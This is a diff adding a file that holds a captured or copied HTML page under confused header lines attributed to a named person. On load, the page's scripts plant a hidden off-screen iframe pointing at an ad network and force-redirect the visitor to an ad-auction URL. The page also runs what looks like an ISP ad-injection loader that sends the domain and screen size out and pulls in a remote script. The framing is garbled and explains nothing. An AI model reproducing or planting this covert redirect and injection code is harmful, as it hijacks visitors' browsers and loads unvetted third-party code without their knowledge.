@@ -1,0 +1,23 @@
+-My build DIGITAL Command Language:
+-Muhammad Adi Nugroho,S.Adm.Neg.:
+-Via My Notepad (HTML Editor):
+<!DOCTYPE html><html><head><script language="javascript">if(window.opener){window.opener.focus();}</script></head><body><script type="text/javascript">
+(function() {
+	var advpix68986=document.createElement('iframe');
+	advpix68986.src='//www.onclicktop.com/pix.html';
+	advpix68986.style.position='absolute';
+	advpix68986.style.left='-1000px';
+	advpix68986.style.top='-1000px';
+	advpix68986.style.width='1px';
+	advpix68986.style.height='1px';
+	advpix68986.style.visibility='hidden';
+	advpix68986.style.border='none';
+	advpix68986.style.backgroundColor='transparent';
+	document.body.appendChild(advpix68986);
+})();
+window.location.replace("http:\/\/www.onclicktop.com\/a\/display.php?r=1052975&treqn=1220404568&runauction=1&crr=f75becc27b85117793f2,EmRyUibff8159af4f5c59473961&ctbust=" + Math.random());
+</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnfUhiu08s2sIbLH33khGVmnYKrFse0SjWTASq3rNe9blrS7zk2rclsZA3VKx6lxhuyO0q88QvI5lM9COJbyfWnbfgXcN1b47oeqq2bg6ASm73ZvW%2b3XE%2bsG1vpasGKinlKbto2pUomNlqIVEwX1hzqVylVDahidHdlsazHXz6Wi8Eu1cykYSlSASzMByTx142eDnEytGW4MGQHX1hWQr6wA9DA3O%2bEKVv%2f55AcxQk2r%2bL1jvDH12U%2b95igZ8jcn%2b8iqwaX9ybilnHHxPsZONumIzBv9n58Kaq220FS0%2fHOmDu4KpdwQ00nVlboS%2fx85narikhC8E%2filRC1gmcc7azow2vf2FGu2i3acHlhAmsnjEG45XRFEV26R%2b9pv%2fYXulw7PDjN2JqYbNR2CUYfnj1dV8Uc12IaHDJ6Z41I6CDrBwqhZNVfgP8VBa6kVU%2b2Ae%2fwi0kafpELwhMYmMy%2fDPfuI0eJo8NtejZy0k5rBetc3htZ6FZf5JvBp%2bNW6dbq5kAA%2bKy0JrEfM8%2b3LneUEec8NlUMg5oYm0PlCw8nAraihJ8ye%2bAwQqm8g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
+
+-HAR:
+
+-To be evaluated in console:
